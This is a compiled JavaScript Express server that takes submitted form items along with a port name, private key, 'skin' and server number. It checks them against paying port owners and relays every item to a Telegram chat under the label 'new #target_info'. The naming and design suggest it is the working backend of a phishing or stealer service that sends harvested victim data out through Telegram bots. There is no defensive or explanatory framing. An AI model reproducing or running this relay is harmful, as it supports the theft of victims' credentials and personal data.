"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g = Object.create((typeof Iterator === "function" ? Iterator : Object).prototype);
    return g.next = verb(0), g["throw"] = verb(1), g["return"] = verb(2), typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
var database_1 = require("./database");
var express = require("express");
var nemoji = require("node-emoji");
var Telegram = require("node-telegram-bot-api");
process.on("uncaughtExceptionMonitor", function (uexceptmonitor) { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        console.error(uexceptmonitor);
        return [2 /*return*/];
    });
}); });
process.on("unhandledRejection", function (unhandle) { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        console.error(unhandle);
        return [2 /*return*/];
    });
}); });
var userdb = new database_1.UserDatabase();
var domaindb = new database_1.DomainDatabase();
var app = express();
app.use(express.json());
var translationTable = {
    'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
    'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
    'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
    'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
    'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
    'm': 'ᴍ'
};
app.post("/send-info", function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
    var info;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                info = req.body;
                console.log(info);
                if ((Object.keys(info).length - 4) > 20) {
                    return [2 /*return*/, res.json({ status: false, message: "too many keys" })];
                }
                if (!info.port || !info.private_key || !info.server_number) {
                    return [2 /*return*/, res.json({ status: false, message: "invalid input" })];
                }
                return [4 /*yield*/, userdb.getUserByPort(info.port, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                        var _theport;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!user) {
                                        return [2 /*return*/, res.json({ status: false, message: "ports owner not found" })];
                                    }
                                    if (user.ban) {
                                        return [2 /*return*/, res.json({ status: false, message: "ports owner has banned" })];
                                    }
                                    console.log(user);
                                    _theport = user.port.find(function (prt) { return prt.name === info.port; });
                                    if (!!_theport) return [3 /*break*/, 1];
                                    return [2 /*return*/, res.json({ status: false, message: "port doesnt match" })];
                                case 1: return [4 /*yield*/, domaindb.getDomainByPrivateKey(info.private_key, function (dm) { return __awaiter(void 0, void 0, void 0, function () {
                                        var bot, entrie, txt, _i, entrie_1, _a, k, v;
                                        return __generator(this, function (_b) {
                                            switch (_b.label) {
                                                case 0:
                                                    if (!dm) {
                                                        return [2 /*return*/, res.json({ status: false, message: "invalid private key" })];
                                                    }
                                                    console.log(_theport);
                                                    bot = new Telegram(_theport.token);
                                                    entrie = Object.entries(info);
                                                    txt = build("\uD83D\uDCE6 | [ ".concat(Object.keys(info).length - 4, " ] items received\n"));
                                                    for (_i = 0, entrie_1 = entrie; _i < entrie_1.length; _i++) {
                                                        _a = entrie_1[_i], k = _a[0], v = _a[1];
                                                        if (typeof k !== "string") {
                                                            continue;
                                                        }
                                                        ;
                                                        if (k === "port") {
                                                            continue;
                                                        }
                                                        ;
                                                        if (k === "private_key") {
                                                            continue;
                                                        }
                                                        ;
                                                        if (k === "skin") {
                                                            continue;
                                                        }
                                                        ;
                                                        if (k === "server_number") {
                                                            continue;
                                                        }
                                                        ;
                                                        if (["string", "number", "boolean", "object"].includes(typeof v)) {
                                                            txt += build("\n".concat(nemoji.random().emoji, " | ").concat(k.replace("_", " "), " : ")) + "<code>".concat(v, "</code>");
                                                        }
                                                    }
                                                    txt += "\n\n\uD83D\uDCE6 | skin : ".concat(info.skin);
                                                    txt += "\n\uD83D\uDEDC | server number : ".concat(info.server_number);
                                                    res.json({ status: true });
                                                    return [4 /*yield*/, bot.sendMessage(_theport.chat, build("\uD83D\uDD78\uFE0F new #target_info\n") + txt, {
                                                            parse_mode: "HTML"
                                                        })];
                                                case 1: return [2 /*return*/, _b.sent()];
                                            }
                                        });
                                    }); })];
                                case 2:
                                    _a.sent();
                                    _a.label = 3;
                                case 3: return [2 /*return*/];
                            }
                        });
                    }); })];
            case 1:
                _a.sent();
                return [2 /*return*/];
        }
    });
}); });
app.post("/get-port-info", function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
    var _a, port, private_key;
    return __generator(this, function (_b) {
        switch (_b.label) {
            case 0:
                console.log(req.body);
                _a = req.body, port = _a.port, private_key = _a.private_key;
                if (!port || !private_key) {
                    return [2 /*return*/, res.json({ status: false, message: "invalid input" })];
                }
                return [4 /*yield*/, domaindb.getDomainByPrivateKey(private_key, function (domain) { return __awaiter(void 0, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!domain) {
                                        return [2 /*return*/, res.json({ status: false, message: "invalid private key" })];
                                    }
                                    return [4 /*yield*/, userdb.getUserByPort(port, function (user) { return __awaiter(void 0, void 0, void 0, function () {
                                            var USR;
                                            return __generator(this, function (_a) {
                                                if (!user) {
                                                    return [2 /*return*/, res.json({ status: false, message: "invalid port name" })];
                                                }
                                                USR = user;
                                                USR.port = user.port.find(function (prt) { return prt.name === port; });
                                                if (user.port === undefined) {
                                                    return [2 /*return*/, res.json({ status: false, message: "invalid port name" })];
                                                }
                                                else {
                                                    delete USR.port.chat;
                                                    delete USR.port.token;
                                                    delete USR.port.bought_on;
                                                    delete USR.coins;
                                                    delete USR.id;
                                                    delete USR.ban;
                                                    return [2 /*return*/, res.json({ status: true, user: user })];
                                                }
                                                return [2 /*return*/];
                                            });
                                        }); })];
                                case 1:
                                    _a.sent();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            case 1:
                _b.sent();
                return [2 /*return*/];
        }
    });
}); });
app.listen(3000, "0.0.0.0", function () { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        console.log("[+] server runned on net-port 3000");
        return [2 /*return*/];
    });
}); });
function build(string) {
    return string.split('').map(function (char) { return translationTable[char] || char; }).join('');
}
